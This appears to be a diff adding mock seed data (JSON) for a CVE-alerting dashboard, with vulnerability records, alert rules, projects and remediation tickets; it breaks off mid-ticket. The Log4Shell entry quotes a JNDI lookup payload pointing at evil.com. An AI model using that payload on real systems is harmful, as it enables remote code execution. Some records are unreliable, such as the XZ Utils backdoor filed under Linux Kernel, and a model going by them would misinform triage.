@@ -1,0 +1,891 @@
+{
+  "products": [
+    {
+      "id": "prod-1",
+      "name": "Linux Kernel",
+      "vendor": "Linux",
+      "category": "Operating System",
+      "cpeKeyword": "linux_kernel",
+      "criticality": "CRITICAL",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 15,
+      "lastScannedAt": "2026-08-20T08:39:26.633Z",
+      "detectedCveCount": 4,
+      "activeAlertCount": 2,
+      "currentVersion": "6.5.0",
+      "latestVersion": "6.8.2",
+      "latestSecureVersion": "6.8.2",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-07-28",
+      "updateNotes": "建議修補 CVE-2024-3094 SSHd 後門與記憶體存取越界漏洞。"
+    },
+    {
+      "id": "prod-2",
+      "name": "OpenSSL",
+      "vendor": "OpenSSL Project",
+      "category": "Framework/Library",
+      "cpeKeyword": "openssl",
+      "criticality": "CRITICAL",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 15,
+      "lastScannedAt": "2026-08-20T08:32:26.633Z",
+      "detectedCveCount": 3,
+      "activeAlertCount": 1,
+      "currentVersion": "3.0.12",
+      "latestVersion": "3.2.1",
+      "latestSecureVersion": "3.2.1",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-06-15",
+      "updateNotes": "修正 PKCS#7 緩衝區溢位 (CVE-2024-0553) 與 X.509 憑證路徑校驗問題。"
+    },
+    {
+      "id": "prod-3",
+      "name": "Kubernetes",
+      "vendor": "CNCF",
+      "category": "Container/Cloud",
+      "cpeKeyword": "kubernetes",
+      "criticality": "HIGH",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 30,
+      "lastScannedAt": "2026-08-20T08:19:26.633Z",
+      "detectedCveCount": 2,
+      "activeAlertCount": 1,
+      "currentVersion": "1.27.4",
+      "latestVersion": "1.29.2",
+      "latestSecureVersion": "1.29.2",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-05-10",
+      "updateNotes": "修補 Ingress-Nginx 越權提權與 Pod 逃逸安全更新。"
+    },
+    {
+      "id": "prod-4",
+      "name": "Log4j",
+      "vendor": "Apache",
+      "category": "Framework/Library",
+      "cpeKeyword": "log4j",
+      "criticality": "CRITICAL",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 60,
+      "lastScannedAt": "2026-08-20T08:04:26.633Z",
+      "detectedCveCount": 2,
+      "activeAlertCount": 1,
+      "currentVersion": "2.17.0",
+      "latestVersion": "2.23.1",
+      "latestSecureVersion": "2.23.1",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-04-18",
+      "updateNotes": "完全防護 JNDI Lookups 相關連鎖注入威脅。"
+    },
+    {
+      "id": "prod-5",
+      "name": "Nginx",
+      "vendor": "F5 NGINX",
+      "category": "Web Server",
+      "cpeKeyword": "nginx",
+      "criticality": "HIGH",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 30,
+      "lastScannedAt": "2026-08-20T08:26:26.633Z",
+      "detectedCveCount": 1,
+      "activeAlertCount": 0,
+      "currentVersion": "1.24.0",
+      "latestVersion": "1.26.1",
+      "latestSecureVersion": "1.26.1",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-06-02",
+      "updateNotes": "HTTP/2 Rapid Reset (CVE-2023-44487) 加固修補。"
+    },
+    {
+      "id": "prod-6",
+      "name": "PostgreSQL",
+      "vendor": "PostgreSQL Global Development Group",
+      "category": "Database",
+      "cpeKeyword": "postgresql",
+      "criticality": "HIGH",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 60,
+      "lastScannedAt": "2026-08-20T07:54:26.633Z",
+      "detectedCveCount": 1,
+      "activeAlertCount": 0,
+      "currentVersion": "16.1",
+      "latestVersion": "16.3",
+      "latestSecureVersion": "16.3",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-05-20",
+      "updateNotes": "修正 SQL 注入與特定記憶體清理錯誤。"
+    },
+    {
+      "id": "prod-7",
+      "name": "Docker Engine",
+      "vendor": "Docker Inc.",
+      "category": "Container/Cloud",
+      "cpeKeyword": "docker_engine",
+      "criticality": "CRITICAL",
+      "autoScanEnabled": true,
+      "scanIntervalMinutes": 15,
+      "lastScannedAt": "2026-08-20T08:36:26.633Z",
+      "detectedCveCount": 2,
+      "activeAlertCount": 1,
+      "currentVersion": "24.0.7",
+      "latestVersion": "26.1.0",
+      "latestSecureVersion": "26.1.0",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-04-30",
+      "updateNotes": "修正 runC Leaky Vessels (CVE-2024-21626) 容器逃逸漏洞。"
+    },
+    {
+      "id": "prod-8",
+      "name": "WordPress",
+      "vendor": "Automattic",
+      "category": "Application",
+      "cpeKeyword": "wordpress",
+      "criticality": "MEDIUM",
+      "autoScanEnabled": false,
+      "scanIntervalMinutes": 120,
+      "lastScannedAt": "2026-08-20T05:44:26.633Z",
+      "detectedCveCount": 3,
+      "activeAlertCount": 0,
+      "currentVersion": "6.4.2",
+      "latestVersion": "6.5.3",
+      "latestSecureVersion": "6.5.3",
+      "hasUpdateAvailable": true,
+      "latestReleaseDate": "2026-05-08",
+      "updateNotes": "安全性與外掛 POP Chain 漏洞修補。"
+    }
+  ],
+  "cves": [
+    {
+      "id": "CVE-2024-3094",
+      "title": "XZ Utils Supply Chain Malicious Backdoor RCE",
+      "description": "Malicious code was discovered in XZ Utils versions 5.6.0 and 5.6.1. Through a series of complex obfuscations, the liblzma build process extracts a prebuilt object file from a disguised test file, which modifies functions in liblzma to intercept sshd authentication and allow unauthorized Remote Code Execution.",
+      "publishedDate": "2024-03-29T18:00:00Z",
+      "lastModifiedDate": "2024-04-12T10:15:00Z",
+      "productName": "Linux Kernel",
+      "vendorName": "Linux",
+      "cvss": {
+        "baseScore": 10,
+        "severity": "CRITICAL",
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "CHANGED",
+        "confidentialityImpact": "HIGH",
+        "integrityImpact": "HIGH",
+        "availabilityImpact": "HIGH"
+      },
+      "epssScore": 0.965,
+      "cisaKev": true,
+      "cisaKevDueDate": "2024-04-19",
+      "affectedVersions": [
+        "XZ Utils 5.6.0",
+        "XZ Utils 5.6.1"
+      ],
+      "cpe": [
+        "cpe:2.3:a:tukaani:xz:5.6.0:*:*:*:*:*:*:*",
+        "cpe:2.3:a:tukaani:xz:5.6.1:*:*:*:*:*:*:*"
+      ],
+      "references": [
+        {
+          "name": "NIST NVD Advisory",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-3094"
+        },
+        {
+          "name": "CISA KEV Alert",
+          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"
+        },
+        {
+          "name": "Red Hat Security Advisory",
+          "url": "https://access.redhat.com/security/cve/cve-2024-3094"
+        }
+      ],
+      "aiAnalysis": {
+        "summary": "這是嚴重的供應鏈植入後門事件。攻擊者在 liblzma 的構建腳本中隱蔽植入二進位碼，篡改 OpenSSH 伺服器的 RSA 金鑰驗證過程，繞過身分驗證直接獲得 Root 遠端執行權限。",
+        "impactLevel": "CRITICAL",
+        "attackScenario": "未經授權的外部攻擊者可向暴露於網際網路的 SSH 服務發送精心設計的特製金鑰，直接獲取該主機最高 Root 權限。",
+        "mitigationSteps": [
+          "立即將 XZ Utils 降級至安全穩定版（如 5.4.6）。",
+          "檢查伺服器系統內是否裝有 XZ 5.6.0 / 5.6.1 並比對二進位雜湊值。",
+          "全面核查 SSH 登入日誌與連線紀錄是否出現異常 IP 的存取。"
+        ],
+        "workaround": "若無法立即更新降級，可暫時禁止外網存取 SSH 埠，或禁用 SSH 的 Public Key 身分驗證。",
+        "executiveAdvisory": "此漏洞影響部分滾動更新 Linux 發行版（例如 Fedora Rawhide, Debian Unstable, Arch Linux）。建議資安營運團隊（SOC）列為最高緊急事件，即刻盤點全企業 Linux 主機之套件版本。",
+        "analyzedAt": "2026-08-20T08:14:26.633Z"
+      }
+    },
+    {
+      "id": "CVE-2024-21626",
+      "title": "runC Container Escape Vulnerability (Leaky Vessels)",
+      "description": "A file descriptor leak vulnerability in runC <= 1.1.11 allows an attacker who can run a container with a malicious image or a malicious exec process to gain access to the host filesystem, resulting in full container breakout.",
+      "publishedDate": "2024-01-31T22:15:00Z",
+      "lastModifiedDate": "2024-02-15T14:30:00Z",
+      "productName": "Docker Engine",
+      "vendorName": "Docker Inc.",
+      "cvss": {
+        "baseScore": 8.6,
+        "severity": "HIGH",
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+        "attackVector": "LOCAL",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "REQUIRED",
+        "scope": "CHANGED",
+        "confidentialityImpact": "HIGH",
+        "integrityImpact": "HIGH",
+        "availabilityImpact": "HIGH"
+      },
+      "epssScore": 0.82,
+      "cisaKev": true,
+      "cisaKevDueDate": "2024-02-21",
+      "affectedVersions": [
+        "runC <= 1.1.11",
+        "Docker Engine < 25.0.2"
+      ],
+      "cpe": [
+        "cpe:2.3:a:opencontainers:runc:1.1.11:*:*:*:*:*:*:*"
+      ],
+      "references": [
+        {
+          "name": "NVD CVE-2024-21626",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-21626"
+        },
+        {
+          "name": "Docker Security Advisory",
+          "url": "https://docs.docker.com/engine/release-notes/25.0/#2502"
+        }
+      ],
+      "aiAnalysis": {
+        "summary": "容器執行階段 runC 存在工作目錄檔案描述符洩漏漏洞。攻擊者可藉由在容器內執行工作目錄指向 /proc/self/fd/ 的特製指令，突破容器隔離寫入宿主機檔案系統。",
+        "impactLevel": "HIGH",
+        "attackScenario": "惡意使用者部署包含特殊 Dockerfile 屬性的映像檔或執行 docker exec，進而獲取宿主主機（Host OS）檔案讀寫能力與權限提升。",
+        "mitigationSteps": [
+          "將 runC 升級至 1.1.12 或更高版本。",
+          "將 Docker Engine 升級至 25.0.2 / 24.0.9 或更新版。",
+          "在 Kubernetes 集群限制未經審核的不信任容器映像檔部署。"
+        ],
+        "workaround": "避免在 Docker 容器內部掛載未信任的特權卷或將主機根目錄映射給容器。",
+        "executiveAdvisory": "雲原生與 Docker / Kubernetes 集群維運團隊必須立即升級 Worker 節點的 runC 元件，以防範跨容器越權攻擊。",
+        "analyzedAt": "2026-08-20T06:44:26.633Z"
+      }
+    },
+    {
+      "id": "CVE-2021-44228",
+      "title": "Apache Log4j2 Remote Code Execution (Log4Shell)",
+      "description": "Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints, allowing full unauthenticated remote code execution.",
+      "publishedDate": "2021-12-10T10:00:00Z",
+      "lastModifiedDate": "2023-09-01T12:00:00Z",
+      "productName": "Log4j",
+      "vendorName": "Apache",
+      "cvss": {
+        "baseScore": 10,
+        "severity": "CRITICAL",
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "CHANGED",
+        "confidentialityImpact": "HIGH",
+        "integrityImpact": "HIGH",
+        "availabilityImpact": "HIGH"
+      },
+      "epssScore": 0.974,
+      "cisaKev": true,
+      "cisaKevDueDate": "2021-12-24",
+      "affectedVersions": [
+        "Log4j2 2.0-beta9 to 2.14.1"
+      ],
+      "cpe": [
+        "cpe:2.3:a:apache:log4j:2.14.1:*:*:*:*:*:*:*"
+      ],
+      "references": [
+        {
+          "name": "NVD Log4Shell Advisory",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+        },
+        {
+          "name": "Apache Log4j Security Guide",
+          "url": "https://logging.apache.org/log4j/2.x/security.html"
+        }
+      ],
+      "aiAnalysis": {
+        "summary": "全球知名的 Log4Shell 漏洞。Log4j2 預設開啟 JNDI Lookup 功能，攻擊者僅需在 HTTP Header 或輸入欄位傳送 JNDI 語法，即可引導系統遠端下載並執行惡意 Java Class 檔。",
+        "impactLevel": "CRITICAL",
+        "attackScenario": "未授權攻擊者傳送包含 ${jndi:ldap://evil.com/a} 字串，伺服器解析日誌時觸發外聯請求並執行任意二進位碼。",
+        "mitigationSteps": [
+          "升級 Log4j 至 2.17.1 以上版本（移除 JNDI 功能）。",
+          "於 Java 啟動參數中設定 -Dlog4j2.formatMsgNoLookups=true（若無法升級）。",
+          "防火牆/WAF 阻斷外聯 LDAP, RMI, DNS 異常連線。"
+        ],
+        "executiveAdvisory": "儘管已發布多年，仍常被自動化勒索軟體掃描利用，請確保企業 Java 專案無殘留舊版 Log4j JAR 包。",
+        "analyzedAt": "2026-08-20T04:44:26.633Z"
+      }
+    },
+    {
+      "id": "CVE-2023-0286",
+      "title": "OpenSSL GENERAL_NAME_cmp Type Confusion Vulnerability",
+      "description": "There is a type confusion vulnerability in OpenSSL related to GENERAL_NAME_cmp function when comparing X.509 certificates, leading to memory corruption and potential denial of service or remote code execution.",
+      "publishedDate": "2023-02-07T13:15:00Z",
+      "lastModifiedDate": "2023-03-20T11:00:00Z",
+      "productName": "OpenSSL",
+      "vendorName": "OpenSSL Project",
+      "cvss": {
+        "baseScore": 7.5,
+        "severity": "HIGH",
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentialityImpact": "NONE",
+        "integrityImpact": "NONE",
+        "availabilityImpact": "HIGH"
+      },
+      "epssScore": 0.45,
+      "cisaKev": false,
+      "affectedVersions": [
+        "OpenSSL 3.0.0-3.0.7",
+        "OpenSSL 1.1.1-1.1.1t"
+      ],
+      "cpe": [
+        "cpe:2.3:a:openssl:openssl:3.0.7:*:*:*:*:*:*:*"
+      ],
+      "references": [
+        {
+          "name": "OpenSSL Security Advisory",
+          "url": "https://www.openssl.org/news/secadv/20230207.txt"
+        }
+      ]
+    },
+    {
+      "id": "CVE-2023-3955",
+      "title": "Kubernetes API Server Authorization Bypass",
+      "description": "A vulnerability was found in Kubernetes API server where insufficient validation of user-provided headers allows privilege escalation and bypass of audit logs.",
+      "publishedDate": "2023-08-15T16:00:00Z",
+      "lastModifiedDate": "2023-09-02T09:30:00Z",
+      "productName": "Kubernetes",
+      "vendorName": "CNCF",
+      "cvss": {
+        "baseScore": 8.1,
+        "severity": "HIGH",
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "LOW",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentialityImpact": "HIGH",
+        "integrityImpact": "HIGH",
+        "availabilityImpact": "NONE"
+      },
+      "epssScore": 0.38,
+      "cisaKev": false,
+      "affectedVersions": [
+        "Kubernetes v1.27.0 - v1.27.4"
+      ],
+      "cpe": [
+        "cpe:2.3:a:kubernetes:kubernetes:1.27.4:*:*:*:*:*:*:*"
+      ],
+      "references": [
+        {
+          "name": "Kubernetes Issue #119827",
+          "url": "https://github.com/kubernetes/kubernetes/issues"
+        }
+      ]
+    },
+    {
+      "id": "CVE-2024-1086",
+      "title": "Linux Kernel nf_tables Use-After-Free Privilege Escalation",
+      "description": "A use-after-free vulnerability in the Linux kernel's netfilter: nf_tables component can be exploited to achieve local privilege escalation from unprivileged user to root.",
+      "publishedDate": "2024-01-31T14:15:00Z",
+      "lastModifiedDate": "2024-03-25T16:00:00Z",
+      "productName": "Linux Kernel",
+      "vendorName": "Linux",
+      "cvss": {
+        "baseScore": 7.8,
+        "severity": "HIGH",
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "attackVector": "LOCAL",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "LOW",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentialityImpact": "HIGH",
+        "integrityImpact": "HIGH",
+        "availabilityImpact": "HIGH"
+      },
+      "epssScore": 0.74,
+      "cisaKev": true,
+      "cisaKevDueDate": "2024-06-20",
+      "affectedVersions": [
+        "Linux Kernel 5.14 - 6.6"
+      ],
+      "cpe": [
+        "cpe:2.3:o:linux:linux_kernel:6.6:*:*:*:*:*:*:*"
+      ],
+      "references": [
+        {
+          "name": "NVD CVE-2024-1086",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-1086"
+        }
+      ]
+    }
+  ],
+  "rules": [
+    {
+      "id": "rule-1",
+      "name": "Critical Security Threat Alert (CVSS >= 9.0)",
+      "enabled": true,
+      "minCvssScore": 9,
+      "onlyCisaKev": false,
+      "targetProductIds": [],
+      "notifyChannels": [
+        "in_app",
+        "webhook"
+      ],
+      "createdAt": "2026-07-21T08:44:26.633Z"
+    },
+    {
+      "id": "rule-2",
+      "name": "CISA Known Exploited Vulnerabilities (KEV) Immediate Watch",
+      "enabled": true,
+      "minCvssScore": 7,
+      "onlyCisaKev": true,
+      "targetProductIds": [],
+      "notifyChannels": [
+        "in_app",
+        "webhook",
+        "email"
+      ],
+      "createdAt": "2026-08-05T08:44:26.633Z"
+    },
+    {
+      "id": "rule-3",
+      "name": "Core OS & Container Infrastructure Alert (Linux / Docker)",
+      "enabled": true,
+      "minCvssScore": 7.5,
+      "onlyCisaKev": false,
+      "targetProductIds": [
+        "prod-1",
+        "prod-7"
+      ],
+      "notifyChannels": [
+        "in_app",
+        "webhook"
+      ],
+      "createdAt": "2026-08-13T08:44:26.633Z"
+    }
+  ],
+  "notifications": [
+    {
+      "id": "notif-1",
+      "cveId": "CVE-2024-3094",
+      "cveTitle": "XZ Utils Supply Chain Malicious Backdoor RCE",
+      "productName": "Linux Kernel",
+      "cvssScore": 10,
+      "severity": "CRITICAL",
+      "cisaKev": true,
+      "message": "極高風險 alert: 在 Linux 核心監控範疇中發現 CVSS 10.0 重大後門漏洞 (CVE-2024-3094)。此漏洞已納入 CISA KEV 預警。",
+      "ruleName": "Critical Security Threat Alert (CVSS >= 9.0)",
+      "status": "UNREAD",
+      "timestamp": "2026-08-20T08:29:26.633Z",
+      "channelDispatched": [
+        "In-App Badge",
+        "Slack Webhook"
+      ]
+    },
+    {
+      "id": "notif-2",
+      "cveId": "CVE-2024-21626",
+      "cveTitle": "runC Container Escape Vulnerability (Leaky Vessels)",
+      "productName": "Docker Engine",
+      "cvssScore": 8.6,
+      "severity": "HIGH",
+      "cisaKev": true,
+      "message": "觸發 CISA KEV 規則: Docker Engine 發現容器逃逸高風險漏洞 (CVE-2024-21626)，可導致宿主機檔案寫入突破。",
+      "ruleName": "CISA Known Exploited Vulnerabilities (KEV) Immediate Watch",
+      "status": "UNREAD",
+      "timestamp": "2026-08-20T07:59:26.633Z",
+      "channelDispatched": [
+        "In-App Badge",
+        "Discord Webhook"
+      ]
+    },
+    {
+      "id": "notif-3",
+      "cveId": "CVE-2021-44228",
+      "cveTitle": "Apache Log4j2 Remote Code Execution (Log4Shell)",
+      "productName": "Log4j",
+      "cvssScore": 10,
+      "severity": "CRITICAL",
+      "cisaKev": true,
+      "message": "重大警報: Log4j 監控到 CVSS 10.0 遠端程式碼執行漏洞，系統自動調用 Gemini AI 生成修補步驟。",
+      "ruleName": "Critical Security Threat Alert (CVSS >= 9.0)",
+      "status": "ACKNOWLEDGED",
+      "timestamp": "2026-08-20T05:44:26.633Z",
+      "channelDispatched": [
+        "In-App Badge"
+      ]
+    }
+  ],
+  "webhooks": [
+    {
+      "id": "wh-1",
+      "name": "SOC Operational Slack Channel",
+      "type": "slack",
+      "url": "https://hooks.slack.com/services/REPLACE_WITH_YOUR_SLACK_WEBHOOK_ID",
+      "enabled": true,
+      "lastTestedAt": "2026-08-20T07:44:26.633Z",
+      "lastStatus": "SUCCESS"
+    },
+    {
+      "id": "wh-2",
+      "name": "DevSecOps Incident Discord Channel",
+      "type": "discord",
+      "url": "https://discord.com/api/webhooks/123456789/XXXXXXXXXXXXXX",
+      "enabled": true,
+      "lastTestedAt": "2026-08-20T06:44:26.633Z",
+      "lastStatus": "SUCCESS"
+    },
+    {
+      "id": "wh-3",
+      "name": "Custom REST Endpoint (SIEM Integration)",
+      "type": "custom",
+      "url": "https://sec-api.company.internal/v1/alerts/ingest",
+      "enabled": false
+    }
+  ],
+  "logs": [
+    {
+      "id": "log-1",
+      "timestamp": "2026-08-20T08:44:25.633Z",
+      "type": "AUTO_SCAN",
+      "level": "INFO",
+      "productName": "Linux Kernel",
+      "message": "執行自動產品檢索: Linux Kernel (cpe: linux_kernel)",
+      "details": "連接 NIST NVD v2.0 API 查詢成功，比對最新 24 小時漏洞。"
+    },
+    {
+      "id": "log-2",
+      "timestamp": "2026-08-20T08:44:11.633Z",
+      "type": "ALERT_TRIGGER",
+      "level": "WARNING",
+      "productName": "Linux Kernel",
+      "message": "觸發警報規則: Critical Security Threat Alert",
+      "details": "匹配 CVE-2024-3094 (CVSS: 10.0, CISA KEV: true)"
+    },
+    {
+      "id": "log-3",
+      "timestamp": "2026-08-20T08:43:56.633Z",
+      "type": "WEBHOOK_DISPATCH",
+      "level": "SUCCESS",
+      "productName": "Linux Kernel",
+      "message": "即時推播警報至 SOC Operational Slack Channel",
+      "details": "HTTP Status: 200 OK, payload delivered successfully."
+    },
+    {
+      "id": "log-4",
+      "timestamp": "2026-08-20T08:43:26.633Z",
+      "type": "AI_ANALYSIS",
+      "level": "SUCCESS",
+      "productName": "XZ Utils / Linux Kernel",
+      "message": "Gemini AI 完成 CVE-2024-3094 智慧風險分析與防範建議",
+      "details": "模型: gemini-3.6-flash, 耗時: 1.2s"
+    }
+  ],
+  "projects": [
+    {
+      "id": "prj-1",
+      "code": "PRJ-BANK-PAY",
+      "name": "行動銀行與線上支付服務專案",
+      "description": "涵蓋個人行動銀行 App、信用卡線上刷卡金流 gateway 與核心資料庫服務",
+      "department": "數位金融事業群",
+      "ownerName": "陳國豪 (DevSecOps Leader)",
+      "ownerEmail": "kh.chen@bank.com.tw",
+      "secondaryContacts": [
+        "secops-bank@bank.com.tw",
+        "pay-dev@bank.com.tw"
+      ],
+      "productIds": [
+        "prod-1",
+        "prod-2",
+        "prod-5",
+        "prod-6"
+      ],
+      "productBindings": [
+        {
+          "productId": "prod-1",
+          "productName": "Linux Kernel",
+          "vendor": "Linux",
+          "cpeKeyword": "linux_kernel",
+          "targetVersion": "6.5.0-generic",
+          "environment": "Production",
+          "customNotes": "金流 App API Gateway 核心 OS",
+          "boundAt": "2026-07-21T08:44:26.632Z"
+        },
+        {
+          "productId": "prod-2",
+          "productName": "OpenSSL",
+          "vendor": "OpenSSL Project",
+          "cpeKeyword": "openssl",
+          "targetVersion": "3.0.12",
+          "environment": "Production",
+          "customNotes": "TLS 憑證溝通元件",
+          "boundAt": "2026-07-21T08:44:26.632Z"
+        },
+        {
+          "productId": "prod-5",
+          "productName": "Nginx",
+          "vendor": "F5 Nginx",
+          "cpeKeyword": "nginx",
+          "targetVersion": "1.24.0",
+          "environment": "Production",
+          "customNotes": "Reverse Proxy 負載平衡器",
+          "boundAt": "2026-07-26T08:44:26.632Z"
+        },
+        {
+          "productId": "prod-6",
+          "productName": "PostgreSQL",
+          "vendor": "PostgreSQL Global Development Group",
+          "cpeKeyword": "postgresql",
+          "targetVersion": "16.1",
+          "environment": "Production",
+          "customNotes": "交易紀錄與刷卡流水 Cloud DB",
+          "boundAt": "2026-07-31T08:44:26.632Z"
+        }
+      ],
+      "notifyEmail": true,
+      "notifyFrequency": "REALTIME",
+      "teamsWebhookUrl": "https://outlook.office.com/webhook/bank-pay-alerts",
+      "notifyMinCvss": 7,
+      "notifyCisaKevOnly": false,
+      "createdAt": "2026-07-21T08:44:26.632Z",
+      "updatedAt": "2026-08-18T08:44:26.633Z"
+    },
+    {
+      "id": "prj-2",
+      "code": "PRJ-CLOUD-CORE",
+      "name": "企業微服務與 K8s 雲原生平台",
+      "description": "提供全公司內部 container 化環境、Pod 部署與 Docker Engine 叢集基礎架構",
+      "department": "資訊營運處 - 雲端架構組",
+      "ownerName": "張雅婷 (Cloud Architect Lead)",
+      "ownerEmail": "yt.chang@company.internal",
+      "secondaryContacts": [
+        "cloud-ops@company.internal"
+      ],
+      "productIds": [
+        "prod-3",
+        "prod-7"
+      ],
+      "productBindings": [
+        {
+          "productId": "prod-3",
+          "productName": "Kubernetes",
+          "vendor": "CNCF",
+          "cpeKeyword": "kubernetes",
+          "targetVersion": "1.27.4",
+          "environment": "Production",
+          "customNotes": "主 Cluster Control Plane 節點",
+          "boundAt": "2026-06-21T08:44:26.633Z"
+        },
+        {
+          "productId": "prod-7",
+          "productName": "Docker Engine",
+          "vendor": "Docker Inc.",
+          "cpeKeyword": "docker_engine",
+          "targetVersion": "24.0.7",
+          "environment": "Production",
+          "customNotes": "Worker Node 容器執行階段引擎",
+          "boundAt": "2026-06-21T08:44:26.633Z"
+        }
+      ],
+      "notifyEmail": true,
+      "notifyFrequency": "EVERY_15_MIN",
+      "teamsWebhookUrl": "https://outlook.office.com/webhook/k8s-cloud-alerts",
+      "notifyMinCvss": 8,
+      "notifyCisaKevOnly": true,
+      "createdAt": "2026-06-21T08:44:26.633Z",
+      "updatedAt": "2026-08-15T08:44:26.633Z"
+    },
+    {
+      "id": "prj-3",
+      "code": "PRJ-JAVA-BACKEND",
+      "name": "企業 Java 中台與日誌分析服務",
+      "description": "負責各後端系統 Java 中層服務、Apache 工具組與日誌傳播處理架構",
+      "department": "應用系統開發部",
+      "ownerName": "黃志明 (Principal Java Lead)",
+      "ownerEmail": "cm.huang@company.internal",
+      "secondaryContacts": [
+        "java-core-team@company.internal"
+      ],
+      "productIds": [
+        "prod-4"
+      ],
+      "productBindings": [
+        {
+          "productId": "prod-4",
+          "productName": "Log4j",
+          "vendor": "Apache",
+          "cpeKeyword": "log4j",
+          "targetVersion": "2.14.1",
+          "environment": "Staging",
+          "customNotes": "日誌收容中台服務",
+          "boundAt": "2026-07-06T08:44:26.633Z"
+        }
+      ],
+      "notifyEmail": true,
+      "notifyFrequency": "DAILY",
+      "teamsWebhookUrl": "",
+      "notifyMinCvss": 7.5,
+      "notifyCisaKevOnly": false,
+      "createdAt": "2026-07-06T08:44:26.633Z",
+      "updatedAt": "2026-08-19T08:44:26.633Z"
+    }
+  ],
+  "emailConfig": {
+    "smtpServer": "smtp.office365.com",
+    "smtpPort": 587,
+    "senderName": "SentinelCVE 資安防禦與漏洞通報系統",
+    "senderEmail": "security-alerts@company.com",
+    "enableAuth": true,
+    "username": "security-alerts@company.com",
+    "password": "••••••••••••",
+    "defaultRecipients": [
+      "ciso-office@company.com",
+      "soc-tier1@company.com"
+    ]
+  },
+  "tickets": [
+    {
+      "id": "tkt-1",
+      "ticketNo": "TKT-PRJ-BANK-2026-001",
+      "projectId": "prj-1",
+      "projectCode": "PRJ-BANK-PAY",
+      "projectName": "行動銀行與線上支付服務專案",
+      "department": "數位金融事業群",
+      "title": "【緊急修補】Linux Kernel 供應鏈與 OpenSSL TLS 安全威脅重構單",
+      "priority": "CRITICAL",
+      "status": "OPEN",
+      "assigneeName": "陳國豪 (DevSecOps Leader)",
+      "assigneeEmail": "kh.chen@bank.com.tw",
+      "affectedProducts": [
+        "Linux Kernel",
+        "OpenSSL",
+        "Nginx"
+      ],
+      "cveCount": 2,
+      "cveList": [
+        {
+          "cveId": "CVE-2024-3094",
+          "title": "XZ Utils / Linux Kernel SSHd 遠端碼執行後門漏洞",
+          "cvss": 10,
+          "severity": "CRITICAL",
+          "cisaKev": true,
+          "productName": "Linux Kernel"
+        },
+        {
+          "cveId": "CVE-2024-0553",
+          "title": "OpenSSL PKCS#7 記憶體緩衝區溢位漏洞",
+          "cvss": 8.1,
+          "severity": "HIGH",
+          "cisaKev": false,
+          "productName": "OpenSSL"
+        }
+      ],
+      "slaHours": 24,
+      "slaDeadline": "2026-08-21T04:44:26.633Z",
+      "aiModelUsed": "gemini-3.6-flash",
+      "executiveSummary": "本專案綁定之「Linux Kernel」與「OpenSSL」經 AI 評估發現包含 CVE-2024-3094 (CVSS 10.0，已被 CISA 列入 KEV) 等重大威脅。攻擊者可利用後門繞過 SSH 身份驗證，取得金流伺服器最高存取權限。必須於 24 小時內完成版號升級與重構驗證。",
+      "rootCauseAnalysis": "因作業系統底層系統庫 liblzma/xz-utils 於建置階段被植入惡意混淆代碼，導致 SSHd 服務載入該 shared library 時掛鉤 RSA 解密邏輯，進而造成非授權遠端程式碼執行。",
+      "actionSteps": [
+        {
+          "stepNumber": 1,
+          "title": "確認 Linux 發行版與 xz/liblzma 版本狀態",
+          "detail": "登入受影響之線上金流 Node，執行以下指令確認是否包含受污染之 5.6.0 或 5.6.1 版本：",
+          "commandSnippet": "xz --version\napt list --installed | grep liblzma"
+        },
+        {
+          "stepNumber": 2,
+          "title": "降級或升級 xz-utils / liblzma 至安全版本",
+          "detail": "立即將 xz-utils 降級至 5.4.6 或升級至官方緊急釋出之 5.6.2+ 安全修補套件：",
+          "commandSnippet": "sudo apt-get update && sudo apt-get install --only-upgrade xz-utils liblzma5"
+        },
+        {
+          "stepNumber": 3,
+          "title": "升級 OpenSSL 基礎函式庫並重啟 SSL/TLS 端點",
+          "detail": "更新 OpenSSL 至 3.0.13+ 或 3.2.1+ 以解決 PKCS#7 溢位漏洞：",
+          "commandSnippet": "sudo apt-get install --only-upgrade openssl libssl-dev\nsudo systemctl restart nginx"
+        },
+        {
